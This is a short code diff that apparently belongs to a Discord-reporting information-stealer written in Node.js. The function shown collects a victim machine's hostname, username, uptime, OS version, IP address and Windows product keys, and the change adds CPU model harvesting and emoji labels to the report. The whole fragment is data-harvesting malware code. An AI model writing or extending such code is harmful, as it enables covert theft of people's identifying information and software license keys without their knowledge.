@@ -18,12 +18,13 @@ const json = async (zipFile) => {
   const uptime = Math.floor(Math.round(Date.now() / 1000) - os.uptime());
   const computerInfoFields = [
     ['💾 RAM', Math.round(os.totalmem() / 1024 / 1024 / 1024) + 'GB'],
+    ['💾 CPUs', [...new Set(os.cpus().map(cpu => cpu.model.trim()))].join(', ')],
     ['👨 Name', code(os.hostname())],
     ['🕘 Uptime', `<t:${uptime}:R> (<t:${uptime}:f>)`],
     ['🥷 Username', code(os.userInfo().username)],
-    ['OS version', os.version()],
-    ['Product Key', code(require('./product-key').productKey)],
-    ['Backup Product Key', code(require('./product-key').backupProductKey)],
+    ['🔄️ OS version', os.version()],
+    ['🔑 Product Key', code(require('./product-key').productKey)],
+    ['🔑 Backup Product Key', code(require('./product-key').backupProductKey)],
   ];
   const ipInfoFields = [
     ['1️⃣ IP Address', `[${code(await ipInfo('query'))}](<https://whatismyipaddress.com/ip/${await ipInfo('query')}>)`],
